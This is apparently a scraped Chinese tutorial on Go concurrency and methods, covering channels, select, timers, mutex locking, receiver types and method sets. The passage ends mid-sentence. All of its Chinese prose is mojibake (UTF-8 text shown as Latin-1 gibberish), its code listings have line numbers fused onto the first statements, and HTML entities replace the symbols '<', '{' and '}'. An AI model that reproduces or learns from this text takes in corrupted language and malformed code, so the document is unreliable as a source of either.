åˆ›å»ºchannelé€šé“æ˜¯å¼•ç”¨ç±»å‹ï¼Œé€šé“ç±»å‹çš„ç©ºå€¼æ˜¯nilã€‚ 12var ch chan intfmt.Println(ch) // &lt;nil&gt; å£°æ˜çš„é€šé“åéœ€è¦ä½¿ç”¨makeå‡½æ•°åˆå§‹åŒ–ä¹‹åæ‰èƒ½ä½¿ç”¨ã€‚ åˆ›å»ºchannelçš„æ ¼å¼å¦‚ä¸‹ï¼š 1make(chan å…ƒç´ ç±»å‹, [ç¼“å†²å¤§å°]) channelçš„ç¼“å†²å¤§å°æ˜¯å¯é€‰çš„ã€‚ ä¸¾å‡ ä¸ªä¾‹å­ï¼š 123ch4 := make(chan int)ch5 := make(chan bool)ch6 := make(chan []int) channelæ“ä½œé€šé“æœ‰å‘é€ï¼ˆsendï¼‰ã€æ¥æ”¶(receiveï¼‰å’Œå…³é—­ï¼ˆcloseï¼‰ä¸‰ç§æ“ä½œã€‚ å‘é€å’Œæ¥æ”¶éƒ½ä½¿ç”¨&lt;-ç¬¦å·ã€‚ ç°åœ¨æˆ‘ä»¬å…ˆä½¿ç”¨ä»¥ä¸‹è¯­å¥å®šä¹‰ä¸€ä¸ªé€šé“ï¼š 1ch := make(chan int) å‘é€å°†ä¸€ä¸ªå€¼å‘é€åˆ°é€šé“ä¸­ã€‚ 1ch &lt;- 10 // æŠŠ10å‘é€åˆ°chä¸­ æ¥æ”¶ä»ä¸€ä¸ªé€šé“ä¸­æ¥æ”¶å€¼ã€‚ 12x := &lt;- ch // ä»chä¸­æ¥æ”¶å€¼å¹¶èµ‹å€¼ç»™å˜é‡x&lt;-ch // ä»chä¸­æ¥æ”¶å€¼ï¼Œå¿½ç•¥ç»“æœ å…³é—­æˆ‘ä»¬é€šè¿‡è°ƒç”¨å†…ç½®çš„closeå‡½æ•°æ¥å…³é—­é€šé“ã€‚ 1close(ch) å…³äºå…³é—­é€šé“éœ€è¦æ³¨æ„çš„äº‹æƒ…æ˜¯ï¼Œåªæœ‰åœ¨é€šçŸ¥æ¥æ”¶æ–¹goroutineæ‰€æœ‰çš„æ•°æ®éƒ½å‘é€å®Œæ¯•çš„æ—¶å€™æ‰éœ€è¦å…³é—­é€šé“ã€‚é€šé“æ˜¯å¯ä»¥è¢«åƒåœ¾å›æ”¶æœºåˆ¶å›æ”¶çš„ï¼Œå®ƒå’Œå…³é—­æ–‡ä»¶æ˜¯ä¸ä¸€æ ·çš„ï¼Œåœ¨ç»“æŸæ“ä½œä¹‹åå…³é—­æ–‡ä»¶æ˜¯å¿…é¡»è¦åšçš„ï¼Œä½†å…³é—­é€šé“ä¸æ˜¯å¿…é¡»çš„ã€‚ å…³é—­åçš„é€šé“æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š 12341.å¯¹ä¸€ä¸ªå…³é—­çš„é€šé“å†å‘é€å€¼å°±ä¼šå¯¼è‡´panicã€‚2.å¯¹ä¸€ä¸ªå…³é—­çš„é€šé“è¿›è¡Œæ¥æ”¶ä¼šä¸€ç›´è·å–å€¼ç›´åˆ°é€šé“ä¸ºç©ºã€‚3.å¯¹ä¸€ä¸ªå…³é—­çš„å¹¶ä¸”æ²¡æœ‰å€¼çš„é€šé“æ‰§è¡Œæ¥æ”¶æ“ä½œä¼šå¾—åˆ°å¯¹åº”ç±»å‹çš„é›¶å€¼ã€‚4.å…³é—­ä¸€ä¸ªå·²ç»å…³é—­çš„é€šé“ä¼šå¯¼è‡´panicã€‚ æ— ç¼“å†²çš„é€šé“ æ— ç¼“å†²çš„é€šé“åˆç§°ä¸ºé˜»å¡çš„é€šé“ã€‚æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ä¸‹é¢çš„ä»£ç ï¼š 12345func main() &#123; ch := make(chan int) ch &lt;- 10 fmt.Println(&quot;å‘é€æˆåŠŸ&quot;)&#125; ä¸Šé¢è¿™æ®µä»£ç èƒ½å¤Ÿé€šè¿‡ç¼–è¯‘ï¼Œä½†æ˜¯æ‰§è¡Œçš„æ—¶å€™ä¼šå‡ºç°ä»¥ä¸‹é”™è¯¯ï¼š 12345fatal error: all goroutines are asleep - deadlock!goroutine 1 [chan send]:main.main() .../src/github.com/pprof/studygo/day06/channel02/main.go:8 +0x54 ä¸ºä»€ä¹ˆä¼šå‡ºç°deadlocké”™è¯¯å‘¢ï¼Ÿ å› ä¸ºæˆ‘ä»¬ä½¿ç”¨ch :&#x3D; make(chan int)åˆ›å»ºçš„æ˜¯æ— ç¼“å†²çš„é€šé“ï¼Œæ— ç¼“å†²çš„é€šé“åªæœ‰åœ¨æœ‰äººæ¥æ”¶å€¼çš„æ—¶å€™æ‰èƒ½å‘é€å€¼ã€‚å°±åƒä½ ä½çš„å°åŒºæ²¡æœ‰å¿«é€’æŸœå’Œä»£æ”¶ç‚¹ï¼Œå¿«é€’å‘˜ç»™ä½ æ‰“ç”µè¯å¿…é¡»è¦æŠŠè¿™ä¸ªç‰©å“é€åˆ°ä½ çš„æ‰‹ä¸­ï¼Œç®€å•æ¥è¯´å°±æ˜¯æ— ç¼“å†²çš„é€šé“å¿…é¡»æœ‰æ¥æ”¶æ‰èƒ½å‘é€ã€‚ ä¸Šé¢çš„ä»£ç ä¼šé˜»å¡åœ¨ch &lt;- 10è¿™ä¸€è¡Œä»£ç å½¢æˆæ­»é”ï¼Œé‚£å¦‚ä½•è§£å†³è¿™ä¸ªé—®é¢˜å‘¢ï¼Ÿ ä¸€ç§æ–¹æ³•æ˜¯å¯ç”¨ä¸€ä¸ªgoroutineå»æ¥æ”¶å€¼ï¼Œä¾‹å¦‚ï¼š 123456789101112131415package mainimport &quot;fmt&quot;func recv(ch chan int) &#123;\tret := &lt;-ch\tfmt.Println(ret, &quot;æ¥æ”¶æˆåŠŸ&quot;)&#125;func main() &#123;\t// å®šä¹‰ä¸€ä¸ªé€šé“\tch := make(chan int)\tgo recv(ch)\tch &lt;- 10\tfmt.Println(ch, &quot;å‘é€æˆåŠŸ&quot;)&#125; æ— ç¼“å†²é€šé“ä¸Šçš„å‘é€æ“ä½œä¼šé˜»å¡ï¼Œç›´åˆ°å¦ä¸€ä¸ªgoroutineåœ¨è¯¥é€šé“ä¸Šæ‰§è¡Œæ¥æ”¶æ“ä½œï¼Œè¿™æ—¶å€¼æ‰èƒ½å‘é€æˆåŠŸï¼Œä¸¤ä¸ªgoroutineå°†ç»§ç»­æ‰§è¡Œã€‚ç›¸åï¼Œå¦‚æœæ¥æ”¶æ“ä½œå…ˆæ‰§è¡Œï¼Œæ¥æ”¶æ–¹çš„goroutineå°†é˜»å¡ï¼Œç›´åˆ°å¦ä¸€ä¸ªgoroutineåœ¨è¯¥é€šé“ä¸Šå‘é€ä¸€ä¸ªå€¼ã€‚ ä½¿ç”¨æ— ç¼“å†²é€šé“è¿›è¡Œé€šä¿¡å°†å¯¼è‡´å‘é€å’Œæ¥æ”¶çš„goroutineåŒæ­¥åŒ–ã€‚å› æ­¤ï¼Œæ— ç¼“å†²é€šé“ä¹Ÿè¢«ç§°ä¸ºåŒæ­¥é€šé“ æœ‰ç¼“å†²çš„é€šé“è§£å†³ä¸Šé¢é—®é¢˜çš„æ–¹æ³•è¿˜æœ‰ä¸€ç§å°±æ˜¯ä½¿ç”¨æœ‰ç¼“å†²åŒºçš„é€šé“ã€‚ æˆ‘ä»¬å¯ä»¥åœ¨ä½¿ç”¨makeå‡½æ•°åˆå§‹åŒ–é€šé“çš„æ—¶å€™ä¸ºå…¶æŒ‡å®šé€šé“çš„å®¹é‡ï¼Œä¾‹å¦‚ï¼š 12345func main() &#123; ch := make(chan int, 1) // åˆ›å»ºä¸€ä¸ªå®¹é‡ä¸º1çš„æœ‰ç¼“å†²åŒºé€šé“ ch &lt;- 10 fmt.Println(&quot;å‘é€æˆåŠŸ&quot;)&#125; åªè¦é€šé“çš„å®¹é‡å¤§äºé›¶ï¼Œé‚£ä¹ˆè¯¥é€šé“å°±æ˜¯æœ‰ç¼“å†²çš„é€šé“ï¼Œé€šé“çš„å®¹é‡è¡¨ç¤ºé€šé“ä¸­èƒ½å­˜æ”¾å…ƒç´ çš„æ•°é‡ã€‚å°±åƒä½ å°åŒºçš„å¿«é€’æŸœåªæœ‰é‚£ä¹ˆä¸ªå¤šæ ¼å­ï¼Œæ ¼å­æ»¡äº†å°±è£…ä¸ä¸‹äº†ï¼Œå°±é˜»å¡äº†ï¼Œç­‰åˆ°åˆ«äººå–èµ°ä¸€ä¸ªå¿«é€’å‘˜å°±èƒ½å¾€é‡Œé¢æ”¾ä¸€ä¸ªã€‚ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å†…ç½®çš„lenå‡½æ•°è·å–é€šé“å†…å…ƒç´ çš„æ•°é‡ï¼Œä½¿ç”¨capå‡½æ•°è·å–é€šé“çš„å®¹é‡ï¼Œè™½ç„¶æˆ‘ä»¬å¾ˆå°‘ä¼šè¿™ä¹ˆåšã€‚ close()å¯ä»¥é€šè¿‡å†…ç½®çš„close()å‡½æ•°å…³é—­channelï¼ˆå¦‚æœä½ çš„ç®¡é“ä¸å¾€é‡Œå­˜å€¼æˆ–è€…å–å€¼çš„æ—¶å€™ä¸€å®šè®°å¾—å…³é—­ç®¡é“ï¼‰ 123456789101112131415161718192021package mainimport &quot;fmt&quot;func main() &#123; c := make(chan int) go func() &#123; for i := 0; i &lt; 5; i++ &#123; c &lt;- i &#125; close(c) &#125;() for &#123; if data, ok := &lt;-c; ok &#123; fmt.Println(data) &#125; else &#123; break &#125; &#125; fmt.Println(&quot;mainç»“æŸ&quot;)&#125; å•å‘é€šé“æœ‰çš„æ—¶å€™æˆ‘ä»¬ä¼šå°†é€šé“ä½œä¸ºå‚æ•°åœ¨å¤šä¸ªä»»åŠ¡å‡½æ•°é—´ä¼ é€’ï¼Œå¾ˆå¤šæ—¶å€™æˆ‘ä»¬åœ¨ä¸åŒçš„ä»»åŠ¡å‡½æ•°ä¸­ä½¿ç”¨é€šé“éƒ½ä¼šå¯¹å…¶è¿›è¡Œé™åˆ¶ï¼Œæ¯”å¦‚é™åˆ¶é€šé“åœ¨å‡½æ•°ä¸­åªèƒ½å‘é€æˆ–åªèƒ½æ¥æ”¶ã€‚ Goè¯­è¨€ä¸­æä¾›äº†å•å‘é€šé“æ¥å¤„ç†è¿™ç§æƒ…å†µã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬æŠŠä¸Šé¢çš„ä¾‹å­æ”¹é€ å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526func counter(out chan&lt;- int) &#123; for i := 0; i &lt; 100; i++ &#123; out &lt;- i &#125; close(out)&#125;func squarer(out chan&lt;- int, in &lt;-chan int) &#123; for i := range in &#123; out &lt;- i * i &#125; close(out)&#125;func printer(in &lt;-chan int) &#123; for i := range in &#123; fmt.Println(i) &#125;&#125;func main() &#123; ch1 := make(chan int) ch2 := make(chan int) go counter(ch1) go squarer(ch2, ch1) printer(ch2)&#125; å…¶ä¸­ï¼Œ 121.chan&lt;- intæ˜¯ä¸€ä¸ªåªèƒ½å‘é€çš„é€šé“ï¼Œå¯ä»¥å‘é€ä½†æ˜¯ä¸èƒ½æ¥æ”¶ï¼›2.&lt;-chan intæ˜¯ä¸€ä¸ªåªèƒ½æ¥æ”¶çš„é€šé“ï¼Œå¯ä»¥æ¥æ”¶ä½†æ˜¯ä¸èƒ½å‘é€ã€‚ åœ¨å‡½æ•°ä¼ å‚åŠä»»ä½•èµ‹å€¼æ“ä½œä¸­å°†åŒå‘é€šé“è½¬æ¢ä¸ºå•å‘é€šé“æ˜¯å¯ä»¥çš„ï¼Œä½†åè¿‡æ¥æ˜¯ä¸å¯ä»¥çš„ã€‚ é€šé“æ€»ç»“channelå¸¸è§çš„å¼‚å¸¸æ€»ç»“ï¼Œå¦‚ä¸‹å›¾ï¼š æ³¨æ„:å…³é—­å·²ç»å…³é—­çš„channelä¹Ÿä¼šå¼•å‘panicã€‚ å®šæ—¶å™¨Timeræ—¶é—´åˆ°äº†ï¼Œæ‰§è¡Œåªæ‰§è¡Œ1æ¬¡ 1234567891011121314package mainimport ( &quot;fmt&quot; &quot;time&quot;)func main() &#123; timer := time.NewTimer(time.Second) fmt.Println(&quot;Timer started...&quot;) &lt;-timer.C // ç­‰å¾…å®šæ—¶å™¨è§¦å‘ fmt.Println(&quot;Timer expired!&quot;)&#125; Tickeræ—¶é—´åˆ°äº†ï¼Œå¤šæ¬¡æ‰§è¡Œ 1234567891011121314151617181920212223package mainimport (\t&quot;fmt&quot;\t&quot;time&quot;)func main() &#123;\tticker := time.NewTicker(1 * time.Second)\ti := 0\tgo func() &#123; for &#123; i++ fmt.Println(&lt;-ticker.C) if i == 5 &#123; ticker.Stop() &#125; &#125;\t&#125;()\tfor &#123;\t&#125;&#125; selectselectå¤šè·¯å¤ç”¨åœ¨æŸäº›åœºæ™¯ä¸‹æˆ‘ä»¬éœ€è¦åŒæ—¶ä»å¤šä¸ªé€šé“æ¥æ”¶æ•°æ®ã€‚é€šé“åœ¨æ¥æ”¶æ•°æ®æ—¶ï¼Œå¦‚æœæ²¡æœ‰æ•°æ®å¯ä»¥æ¥æ”¶å°†ä¼šå‘ç”Ÿé˜»å¡ã€‚ä½ ä¹Ÿè®¸ä¼šå†™å‡ºå¦‚ä¸‹ä»£ç ä½¿ç”¨éå†çš„æ–¹å¼æ¥å®ç°ï¼š selectçš„ä½¿ç”¨ç±»ä¼¼äºswitchè¯­å¥ï¼Œå®ƒæœ‰ä¸€ç³»åˆ—caseåˆ†æ”¯å’Œä¸€ä¸ªé»˜è®¤çš„åˆ†æ”¯ã€‚æ¯ä¸ªcaseä¼šå¯¹åº”ä¸€ä¸ªé€šé“çš„é€šä¿¡ï¼ˆæ¥æ”¶æˆ–å‘é€ï¼‰è¿‡ç¨‹ã€‚selectä¼šä¸€ç›´ç­‰å¾…ï¼Œç›´åˆ°æŸä¸ªcaseçš„é€šä¿¡æ“ä½œå®Œæˆæ—¶ï¼Œå°±ä¼šæ‰§è¡Œcaseåˆ†æ”¯å¯¹åº”çš„è¯­å¥ã€‚å…·ä½“æ ¼å¼å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031package mainimport (\t&quot;fmt&quot;\t&quot;time&quot;)func test1(ch chan string) &#123;\ttime.Sleep(time.Second * 5)\tch &lt;- &quot;test1&quot;&#125;func test2(ch chan string) &#123;\ttime.Sleep(time.Second * 2)\tch &lt;- &quot;test2&quot;&#125;func main() &#123;\t// 2ä¸ªç®¡é“\toutput1 := make(chan string)\toutput2 := make(chan string)\t// è·‘2ä¸ªå­åç¨‹ï¼Œå†™æ•°æ®\tgo test1(output1)\tgo test2(output2)\t// ç”¨selectç›‘æ§\tselect &#123;\tcase s1 := &lt;-output1: fmt.Println(&quot;s1=&quot;, s1)\tcase s2 := &lt;-output2: fmt.Println(&quot;s2=&quot;, s2)\t&#125;&#125; å¦‚æœå¤šä¸ªchannelåŒæ—¶readyï¼Œåˆ™éšæœºé€‰æ‹©ä¸€ä¸ªæ‰§è¡Œ 12345678910111213141516171819202122232425package mainimport ( &quot;fmt&quot;)func main() &#123; // åˆ›å»º2ä¸ªç®¡é“ int_chan := make(chan int, 1) string_chan := make(chan string, 1) go func() &#123; //time.Sleep(2 * time.Second) int_chan &lt;- 1 &#125;() go func() &#123; string_chan &lt;- &quot;hello&quot; &#125;() select &#123; case value := &lt;-int_chan: fmt.Println(&quot;int:&quot;, value) case value := &lt;-string_chan: fmt.Println(&quot;string:&quot;, value) &#125; fmt.Println(&quot;mainç»“æŸ&quot;)&#125; å¹¶å‘å®‰å…¨å’Œé”æœ‰æ—¶å€™åœ¨Goä»£ç ä¸­å¯èƒ½ä¼šå­˜åœ¨å¤šä¸ªgoroutineåŒæ—¶æ“ä½œä¸€ä¸ªèµ„æºï¼ˆä¸´ç•ŒåŒºï¼‰ï¼Œè¿™ç§æƒ…å†µä¼šå‘ç”Ÿç«æ€é—®é¢˜ï¼ˆæ•°æ®ç«æ€ï¼‰ã€‚ç±»æ¯”ç°å®ç”Ÿæ´»ä¸­çš„ä¾‹å­æœ‰åå­—è·¯å£è¢«å„ä¸ªæ–¹å‘çš„çš„æ±½è½¦ç«äº‰ï¼›è¿˜æœ‰ç«è½¦ä¸Šçš„å«ç”Ÿé—´è¢«è½¦å¢é‡Œçš„äººç«äº‰ã€‚ 1234567891011121314151617181920212223242526272829package mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;)var x int64var wg sync.WaitGroupfunc add() &#123;\tfor i := 0; i &lt; 5000; i++ &#123; x = x + 1\t&#125;\twg.Done()&#125;func sub() &#123;\tfor i := 0; i &lt; 5000; i++ &#123; x = x - 1\t&#125;\twg.Done()&#125;func main() &#123;\twg.Add(2)\tgo add()\tgo sub()\twg.Wait()\tfmt.Println(x)&#125; ä¸Šé¢çš„ä»£ç ä¸­æˆ‘ä»¬å¼€å¯äº†ä¸¤ä¸ªgoroutineå»åŠ å‡xçš„å€¼ï¼Œè¿™ä¸¤ä¸ªgoroutineåœ¨è®¿é—®å’Œä¿®æ”¹xå˜é‡çš„æ—¶å€™å°±ä¼šå­˜åœ¨æ•°æ®ç«äº‰ï¼Œå¯¼è‡´æœ€åçš„ç»“æœä¸æ˜¯ 0ã€‚ äº’æ–¥é”äº’æ–¥é”æ˜¯ä¸€ç§å¸¸ç”¨çš„æ§åˆ¶å…±äº«èµ„æºè®¿é—®çš„æ–¹æ³•ï¼Œå®ƒèƒ½å¤Ÿä¿è¯åŒæ—¶åªæœ‰ä¸€ä¸ªgoroutineå¯ä»¥è®¿é—®å…±äº«èµ„æºã€‚Goè¯­è¨€ä¸­ä½¿ç”¨syncåŒ…çš„Mutexç±»å‹æ¥å®ç°äº’æ–¥é”ã€‚ ä½¿ç”¨äº’æ–¥é”æ¥ä¿®å¤ä¸Šé¢ä»£ç çš„é—®é¢˜ï¼š 12345678910111213141516171819202122232425262728293031323334package mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;)var x int64var wg sync.WaitGroupvar lock sync.Mutexfunc add() &#123;\tfor i := 0; i &lt; 5000; i++ &#123; lock.Lock() //åŠ é” x = x + 1 lock.Unlock() //è§£é”\t&#125;\twg.Done()&#125;func sub() &#123;\tfor i := 0; i &lt; 5000; i++ &#123; lock.Lock() //åŠ é” x = x - 1 lock.Unlock() //è§£é”\t&#125;\twg.Done()&#125;func main() &#123;\twg.Add(2)\tgo add()\tgo sub()\twg.Wait()\tfmt.Println(x)&#125; æ–¹æ³•Golang æ–¹æ³•æ€»æ˜¯ç»‘å®šå¯¹è±¡å®ä¾‹ï¼Œå¹¶éšå¼å°†å®ä¾‹ä½œä¸ºç¬¬ä¸€å®å‚ (receiver)ã€‚ 12345â€¢ åªèƒ½ä¸ºå½“å‰åŒ…å†…å‘½åç±»å‹å®šä¹‰æ–¹æ³•ã€‚â€¢ å‚æ•° receiver å¯ä»»æ„å‘½åã€‚å¦‚æ–¹æ³•ä¸­æœªæ›¾ä½¿ç”¨ ï¼Œå¯çœç•¥å‚æ•°åã€‚â€¢ å‚æ•° receiver ç±»å‹å¯ä»¥æ˜¯ T æˆ– *Tã€‚åŸºç±»å‹ T ä¸èƒ½æ˜¯æ¥å£æˆ–æŒ‡é’ˆã€‚ â€¢ ä¸æ”¯æŒæ–¹æ³•é‡è½½ï¼Œreceiver åªæ˜¯å‚æ•°ç­¾åçš„ç»„æˆéƒ¨åˆ†ã€‚â€¢ å¯ç”¨å®ä¾‹ value æˆ– pointer è°ƒç”¨å…¨éƒ¨æ–¹æ³•ï¼Œç¼–è¯‘å™¨è‡ªåŠ¨è½¬æ¢ã€‚ ä¸€ä¸ªæ–¹æ³•å°±æ˜¯ä¸€ä¸ªåŒ…å«äº†æ¥å—è€…çš„å‡½æ•°ï¼Œæ¥å—è€…å¯ä»¥æ˜¯å‘½åç±»å‹æˆ–è€…ç»“æ„ä½“ç±»å‹çš„ä¸€ä¸ªå€¼æˆ–è€…æ˜¯ä¸€ä¸ªæŒ‡é’ˆã€‚ æ‰€æœ‰ç»™å®šç±»å‹çš„æ–¹æ³•å±äºè¯¥ç±»å‹çš„æ–¹æ³•é›† æ–¹æ³•å®šä¹‰123func (recevier type) methodName(å‚æ•°åˆ—è¡¨)(è¿”å›å€¼åˆ—è¡¨)&#123;&#125; å‚æ•°å’Œè¿”å›å€¼å¯ä»¥çœç•¥ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455package maintype Test struct&#123;&#125;// æ— å‚æ•°ã€æ— è¿”å›å€¼func (t Test) method0() &#123;&#125;// å•å‚æ•°ã€æ— è¿”å›å€¼func (t Test) method1(i int) &#123;&#125;// å¤šå‚æ•°ã€æ— è¿”å›å€¼func (t Test) method2(x, y int) &#123;&#125;// æ— å‚æ•°ã€å•è¿”å›å€¼func (t Test) method3() (i int) &#123; return&#125;// å¤šå‚æ•°ã€å¤šè¿”å›å€¼func (t Test) method4(x, y int) (z int, err error) &#123; return&#125;// æ— å‚æ•°ã€æ— è¿”å›å€¼func (t *Test) method5() &#123;&#125;// å•å‚æ•°ã€æ— è¿”å›å€¼func (t *Test) method6(i int) &#123;&#125;// å¤šå‚æ•°ã€æ— è¿”å›å€¼func (t *Test) method7(x, y int) &#123;&#125;// æ— å‚æ•°ã€å•è¿”å›å€¼func (t *Test) method8() (i int) &#123; return&#125;// å¤šå‚æ•°ã€å¤šè¿”å›å€¼func (t *Test) method9(x, y int) (z int, err error) &#123; return&#125;func main() &#123;&#125; ä¸‹é¢å®šä¹‰ä¸€ä¸ªç»“æ„ä½“ç±»å‹å’Œè¯¥ç±»å‹çš„ä¸€ä¸ªæ–¹æ³•ï¼š 1234567891011121314151617181920212223package mainimport &quot;fmt&quot;type User struct &#123;\tname string\tage int&#125;// æ–¹æ³•func (u User) Notify() &#123;\tfmt.Printf(&quot;name: %v, age: %v &quot;, u.name, u.age)&#125;\tfunc main() &#123;\t// åˆ›å»ºå¯¹è±¡\tuser := User&#123;&quot;Tom&quot;, 18&#125;\tuser.Notify()\tuser2 := User&#123;&quot;Jerry&quot;, 20&#125;\tuser3 := &amp;user2\tuser3.Notify()&#125; 12name: Tom, age: 18name: Jerry, age: 20 æ³¨æ„ï¼šå½“æ¥å—è€…æ˜¯æŒ‡é’ˆæ—¶ï¼Œå³ä½¿ç”¨å€¼ç±»å‹è°ƒç”¨é‚£ä¹ˆå‡½æ•°å†…éƒ¨ä¹Ÿæ˜¯å¯¹æŒ‡é’ˆçš„æ“ä½œã€‚ æ–¹æ³•ä¸è¿‡æ˜¯ä¸€ç§ç‰¹æ®Šçš„å‡½æ•°ï¼Œåªéœ€å°†å…¶è¿˜åŸï¼Œå°±çŸ¥é“ receiver T å’Œ *T çš„å·®åˆ«ã€‚ 123456789101112131415161718192021222324252627package mainimport &quot;fmt&quot;type Data struct &#123; x int&#125;func (self Data) ValueTest() &#123; // func ValueTest(self Data); fmt.Printf(&quot;Value: %p &quot;, &amp;self)&#125;func (self *Data) PointerTest() &#123; // func PointerTest(self *Data); fmt.Printf(&quot;Pointer: %p &quot;, self)&#125;func main() &#123; d := Data&#123;&#125; p := &amp;d fmt.Printf(&quot;Data: %p &quot;, p) d.ValueTest() // ValueTest(d) d.PointerTest() // PointerTest(&amp;d) p.ValueTest() // ValueTest(*p) p.PointerTest() // PointerTest(p)&#125; 12345Data: 0x1400000e108Value: 0x1400000e118Pointer: 0x1400000e108Value: 0x1400000e120Pointer: 0x1400000e108 æ™®é€šå‡½æ•°ä¸æ–¹æ³•çš„åŒºåˆ«1.å¯¹äºæ™®é€šå‡½æ•°ï¼Œæ¥æ”¶è€…ä¸ºå€¼ç±»å‹æ—¶ï¼Œä¸èƒ½å°†æŒ‡é’ˆç±»å‹çš„æ•°æ®ç›´æ¥ä¼ é€’ï¼Œåä¹‹äº¦ç„¶ã€‚ 2.å¯¹äºæ–¹æ³•ï¼ˆå¦‚structçš„æ–¹æ³•ï¼‰ï¼Œæ¥æ”¶è€…ä¸ºå€¼ç±»å‹æ—¶ï¼Œå¯ä»¥ç›´æ¥ç”¨æŒ‡é’ˆç±»å‹çš„å˜é‡è°ƒç”¨æ–¹æ³•ï¼Œåè¿‡æ¥åŒæ ·ä¹Ÿå¯ä»¥ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465package main//æ™®é€šå‡½æ•°ä¸æ–¹æ³•çš„åŒºåˆ«ï¼ˆåœ¨æ¥æ”¶è€…åˆ†åˆ«ä¸ºå€¼ç±»å‹å’ŒæŒ‡é’ˆç±»å‹çš„æ—¶å€™ï¼‰import &quot;fmt&quot;// 1.æ™®é€šå‡½æ•°// æ¥æ”¶å€¼ç±»å‹å‚æ•°çš„å‡½æ•°func valueIntTest(a int) int &#123;\treturn a + 10&#125;// æ¥æ”¶æŒ‡é’ˆç±»å‹å‚æ•°çš„å‡½æ•°func pointerIntTest(a *int) int &#123;\treturn *a + 10&#125;func structTestValue() &#123;\ta := 2\tfmt.Println(&quot;valueIntTest:&quot;, valueIntTest(a))\t//å‡½æ•°çš„å‚æ•°ä¸ºå€¼ç±»å‹ï¼Œåˆ™ä¸èƒ½ç›´æ¥å°†æŒ‡é’ˆä½œä¸ºå‚æ•°ä¼ é€’\t//fmt.Println(&quot;valueIntTest:&quot;, valueIntTest(&amp;a))\t//compile error: cannot use &amp;a (type *int) as type int in function argument\tb := 5\tfmt.Println(&quot;pointerIntTest:&quot;, pointerIntTest(&amp;b))\t//åŒæ ·ï¼Œå½“å‡½æ•°çš„å‚æ•°ä¸ºæŒ‡é’ˆç±»å‹æ—¶ï¼Œä¹Ÿä¸èƒ½ç›´æ¥å°†å€¼ç±»å‹ä½œä¸ºå‚æ•°ä¼ é€’\t//fmt.Println(&quot;pointerIntTest:&quot;, pointerIntTest(b))\t//cannot use b (variable of type int) as *int value in argument to pointerIntTest&#125;//2.æ–¹æ³•type PersonD struct &#123; id int name string&#125;//æ¥æ”¶è€…ä¸ºå€¼ç±»å‹func (p PersonD) valueShowName() &#123; fmt.Println(p.name)&#125;//æ¥æ”¶è€…ä¸ºæŒ‡é’ˆç±»å‹func (p *PersonD) pointShowName() &#123; fmt.Println(p.name)&#125;func structTestFunc() &#123; //å€¼ç±»å‹è°ƒç”¨æ–¹æ³• personValue := PersonD&#123;101, &quot;hello world&quot;&#125; personValue.valueShowName() personValue.pointShowName() //æŒ‡é’ˆç±»å‹è°ƒç”¨æ–¹æ³• personPointer := &amp;PersonD&#123;102, &quot;hello golang&quot;&#125; personPointer.valueShowName() personPointer.pointShowName() //ä¸æ™®é€šå‡½æ•°ä¸åŒï¼Œæ¥æ”¶è€…ä¸ºæŒ‡é’ˆç±»å‹å’Œå€¼ç±»å‹çš„æ–¹æ³•ï¼ŒæŒ‡é’ˆç±»å‹å’Œå€¼ç±»å‹çš„å˜é‡å‡å¯ç›¸äº’è°ƒç”¨&#125;func main() &#123;\tstructTestValue()\tstructTestFunc()&#125; 123456valueIntTest: 12pointerIntTest: 15hello worldhello worldhello golanghello golang åŒ¿åå­—æ®µGolangåŒ¿åå­—æ®µ ï¼šå¯ä»¥åƒå­—æ®µæˆå‘˜é‚£æ ·è®¿é—®åŒ¿åå­—æ®µæ–¹æ³•ï¼Œç¼–è¯‘å™¨è´Ÿè´£æŸ¥æ‰¾ã€‚ 12345678910111213141516171819202122package mainimport &quot;fmt&quot;type User struct &#123; id int name string&#125;type Manager struct &#123; User&#125;func (self *User) ToString() string &#123; // receiver = &amp;(Manager.User) return fmt.Sprintf(&quot;User: %p, %v&quot;, self, self)&#125;func main() &#123; m := Manager&#123;User&#123;1, &quot;Tom&quot;&#125;&#125; fmt.Printf(&quot;Manager: %p &quot;, &amp;m) fmt.Println(m.ToString())&#125; 12Manager: 0x140000a4018User: 0x140000a4018, &amp;&#123;1 Tom&#125; é€šè¿‡åŒ¿åå­—æ®µï¼Œå¯è·å¾—å’Œç»§æ‰¿ç±»ä¼¼çš„å¤ç”¨èƒ½åŠ›ã€‚ä¾æ®ç¼–è¯‘å™¨æŸ¥æ‰¾æ¬¡åºï¼Œåªéœ€åœ¨å¤–å±‚å®šä¹‰åŒåæ–¹æ³•ï¼Œå°±å¯ä»¥å®ç° â€œoverrideâ€ã€‚ 1234567891011121314151617181920212223242526272829package mainimport &quot;fmt&quot;type User struct &#123; id int name string&#125;type Manager struct &#123; User title string&#125;func (self *User) ToString() string &#123; return fmt.Sprintf(&quot;User: %p, %v&quot;, self, self)&#125;func (self *Manager) ToString() string &#123; return fmt.Sprintf(&quot;Manager: %p, %v&quot;, self, self)&#125;func main() &#123; m := Manager&#123;User&#123;1, &quot;Tom&quot;&#125;, &quot;Administrator&quot;&#125; fmt.Println(m.ToString()) fmt.Println(m.User.ToString())&#125; 12Manager: 0x14000194090, &amp;&#123;&#123;1 Tom&#125; Administrator&#125;User: 0x14000194090, &amp;&#123;1 Tom&#125; æ–¹æ³•é›†Golangæ–¹æ³•é›† ï¼šæ¯ä¸ªç±»å‹éƒ½æœ‰ä¸ä¹‹å…³è”çš„æ–¹æ³•é›†ï¼Œè¿™ä¼šå½±å“åˆ°æ¥å£å®ç°è§„åˆ™ã€‚ 12345â€¢ ç±»å‹ T æ–¹æ³•é›†åŒ…å«å…¨éƒ¨ receiver T æ–¹æ³•ã€‚â€¢ ç±»å‹ *T æ–¹æ³•é›†åŒ…å«å…¨éƒ¨ receiver T + *T æ–¹æ³•ã€‚â€¢ å¦‚ç±»å‹ S åŒ…å«åŒ¿åå­—æ®µ Tï¼Œåˆ™ S å’Œ *S æ–¹æ³•é›†åŒ…å« T æ–¹æ³•ã€‚ â€¢ å¦‚ç±»å‹ S åŒ…å«åŒ¿åå­—æ®µ *Tï¼Œåˆ™ S 